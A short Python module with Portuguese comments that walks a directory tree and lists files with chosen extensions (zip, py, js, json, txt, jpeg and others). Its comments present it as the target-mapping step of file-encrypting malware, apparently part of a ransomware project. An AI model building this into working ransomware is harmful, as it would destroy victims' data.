#Arquivo Discovery = Serve pra "Mapear" os arquivos para serem encriptados

import os #Ajuda a navegar no FileSystem do SO

def discover(initial_path): #Caminho inicial onde o FileDiscover vai começar
    #Extensões de arquivos para possíveis ataques
    extensions = ['zip', 'py', 'js', 'json', 'lua', 'txt', 'jpeg']
    for dirpath, dirs, files in os.walk(initial_path):
        #Encriptar somente arquivos
        for _file in files:
            abspath = os.path.abspath(os.path.join(dirpath, _file))
            ext = abspath.split('.')[-1]
            if ext in extensions:
                yield abspath #yield = Return, mas volta a executar

#Quando o Módulo diretamente for executado, isso acontece
if __name__ == '__main__':
    x = discover(os.getcwd())
    for i in x:
        print(i)
